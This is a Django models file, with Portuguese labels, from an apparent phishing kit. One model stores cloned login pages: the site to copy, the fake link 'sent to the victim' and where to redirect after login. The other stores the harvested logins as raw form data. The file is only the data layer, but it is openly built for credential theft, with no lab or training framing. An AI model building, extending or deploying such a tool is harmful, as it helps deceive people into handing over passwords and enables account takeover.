from django.db import models



# Create your models here.

class TemplateCopy(models.Model):
    """
    Onde será armazenado os templates
    """
    title = models.CharField(verbose_name='Título para esse conteúdo', max_length=30, unique=True)
    url_clonar = models.URLField(verbose_name='URL do site que será clonado', max_length=200, blank=True, null=True)
    url_fake = models.CharField(verbose_name='URL que será enviada para a vítima', max_length=200, unique=True, help_text="Ex: site.com/aqui o nome do seu link/")
    content = models.TextField(verbose_name='HTML da página', blank=True, null=True)
    redirect = models.CharField(verbose_name='Para onde redirecionar após login', max_length=500, blank=True, null=True, help_text='Se deixar vazio, irá redirecionar para a própria tela de login')

    def __str__(self):
        return self.title


class Account(models.Model):
    """
    Onde será armazenado os logins pegos
    """
    template = models.ForeignKey(verbose_name='Por qual template veio a informação', to=TemplateCopy, related_name='template', on_delete=models.DO_NOTHING)
    datas = models.TextField(verbose_name='Dados vindos do formulário', blank=True, null=True)
    
    def __str__(self):
        return f"{self.template.title} - {self.datas}"




